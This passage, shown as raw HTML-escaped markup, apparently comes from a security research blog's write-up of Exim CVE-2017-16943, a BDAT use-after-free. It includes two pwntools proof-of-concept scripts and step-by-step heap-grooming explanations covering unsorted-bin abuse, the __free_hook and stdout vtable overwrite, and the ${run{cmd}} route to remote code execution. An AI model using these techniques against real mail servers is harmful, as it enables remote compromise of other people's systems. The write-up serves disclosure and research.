&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;BDAT 1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;&lt;br /&gt;
 In order to achieve code execution, we need to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; get the first store of a block. That is, running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and making &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; allocate a new block. Therefore, we send a long message &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;a&#39;*0x1250+&#39;\x7f&#39;&lt;/code&gt; with an unprintable character to cut &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, making &lt;code class=&quot;highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; less than 0x100.&lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Starts BDAT data transfer&lt;br /&gt;
 After that, we send BDAT command to start data transfer. At the beginning, &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; are allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 The function &lt;code class=&quot;highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; is called sequentially and it also calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. Notice that this function uses &lt;strong&gt;ANOTHER &lt;code class=&quot;highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;&lt;/strong&gt;, so it allocates from heap without changing &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; which &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; also points to.&lt;br /&gt;
 &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734&quot;&gt;receive.c: 1734 receive_msg&lt;/a&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_batched_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dkim_disable_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;dkim_exim_verify_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CHUNKING_OFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;highlighter-rouge&quot;&gt;store_getc&lt;/code&gt; inside &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;&lt;br /&gt;
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;string_printing&lt;/code&gt;. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg until extension and bug triggered&lt;br /&gt;
 In this way, while we keep sending huge messages, &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, &lt;code class=&quot;highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; allocated chunks after &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt;, and therefore &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt; is overwritten to &lt;code class=&quot;highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; inside &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena&lt;/code&gt; of libc (linked list pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; points back to &lt;code class=&quot;highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; if no other freed chunk exists). &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg for the next extension&lt;br /&gt;
 When the next extension occurs, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; tries to cut from &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;, which makes attackers able to overwrite all global variables below main_arena.&lt;/li&gt;
  &lt;li&gt;Overwrite global variables in libc&lt;/li&gt;
  &lt;li&gt;Finish sending message and trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt;&lt;br /&gt;
 In the PoC, we simply modified &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and ended the line. Exim calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset&lt;/code&gt; to reset the buffer and calls &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt;. At this stage, we successfully controlled instruction pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;$rip&lt;/code&gt;.&lt;br /&gt;
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_IO_2_1_stdout_&lt;/code&gt;. We forged the vtable of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; and set &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; to any call of &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both &lt;code class=&quot;highlighter-rouge&quot;&gt;$rip&lt;/code&gt; and the content of first argument. &lt;br /&gt;
 We consulted past CVE exploits and decided to call &lt;code class=&quot;highlighter-rouge&quot;&gt;expand_string&lt;/code&gt;, which executes command with &lt;code class=&quot;highlighter-rouge&quot;&gt;execv&lt;/code&gt; if we set the first argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, and finally we got our RCE. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;exploit-for-default-configured-exim&quot;&gt;Exploit for default configured exim&lt;/h4&gt;
&lt;p&gt;When dkim is disabled, the PoC above fails because &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is the last chunk on heap. This makes the system merge it into a big chunk called &lt;strong&gt;top chunk&lt;/strong&gt; rather than unsorted bin.&lt;br /&gt;
The illustrations below describe the difference of heap layout:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.&lt;/p&gt;

&lt;p&gt;After running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use DATA command to send lots of data&lt;br /&gt;
 Send huge data, make the chunk big and extend many times. After several extension, it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.&lt;/li&gt;
  &lt;li&gt;End DATA transfer and start a new email&lt;br /&gt;
 Restart to send an email with BDAT command after the heap chunk is prepared.&lt;/li&gt;
  &lt;li&gt;Adjust &lt;code class=&quot;highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; again&lt;br /&gt;
 Send invalid command with an unprintable charater again to cut the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Finally the heap layout is like:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.&lt;br /&gt;
The following is the PoC for default configured exim:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1280&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;DATA&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itself&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3480&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;BDAT 1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A demo of our exploit is as below.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/7-demo.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.&lt;/p&gt;

&lt;h1 id=&quot;incorrect-bdat-data-handling-leads-to-dos&quot;&gt;Incorrect BDAT data handling leads to DoS&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis-1&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
